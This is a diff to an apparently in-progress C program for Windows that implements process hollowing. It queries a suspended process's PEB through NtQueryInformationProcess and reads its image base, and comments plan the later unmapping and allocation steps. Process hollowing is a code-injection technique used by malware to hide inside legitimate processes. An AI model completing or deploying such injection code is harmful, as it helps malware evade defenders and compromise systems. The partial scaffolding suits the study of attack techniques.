@@ -1,7 +1,7 @@
 //idea from https://github.com/m0n0ph1/Process-Hollowing
 #include <windows.h>
 #include <stdio.h>
-#include <types.h>
+#include "types.h"
 
 int main(int argc, char* argv[]){
     //first create a process in suspended state
@@ -23,23 +23,37 @@ int main(int argc, char* argv[]){
         printf("[!] Error creating process %d\n", GetLastError());
         return 1;
     }
-    //load ntdll and get our native function
-    HMODULE hNtdll = LoadLibraryA("ntdll");
-    FARPROC adrNtQueryInformationProcess = GetProcAddress(hNtdll, "NtQueryInformationProcess");
-    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess) adrNtQueryInformationProcess;
+    //load ntdll
+    HMODULE ntdll = LoadLibraryA("ntdll");
+    FARPROC fpNtQueryInformationProcess = GetProcAddress(ntdll, "NtQueryInformationProcess");
+    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
     //find the base address from the PEB block
     PROCESS_BASIC_INFORMATION pbi;
     DWORD returnLength = 0;
-    if(!NtQueryInformationProcess(
+    NTSTATUS status;
+    status = ntQueryInformationProcess(
         pi.hProcess, 
-        ProcessBasicInformation, 
-        pbi, 
+        0, 
+        &pbi, 
         sizeof(PROCESS_BASIC_INFORMATION), 
-        &returnLength) != 0){
-        printf("[!] Error querying process information: %d", GetLastError());
+        &returnLength);
+    if(status != 0){
+        printf("[!] Error querying process information: %x", status);
         return 1;
     }
-    printf("Got session ID: %x\n", pbi->PebBaseAddress);
+
+    PEB peb;
+    if(!ReadProcessMemory(
+        pi.hProcess,
+        (LPCVOID)pbi.PebBaseAddress,
+        &peb,
+        sizeof(PEB),
+        0
+    )){
+        printf("[!] Error reading process memory: %d", GetLastError());
+        return 1;
+    }
+    printf("base address: %x\n", peb.ImageBaseAddress);
     //read the NT headers
     //unmap destination section with NtUnmapViewOfSection
     //allocate memory for new image with virtuallocex, 
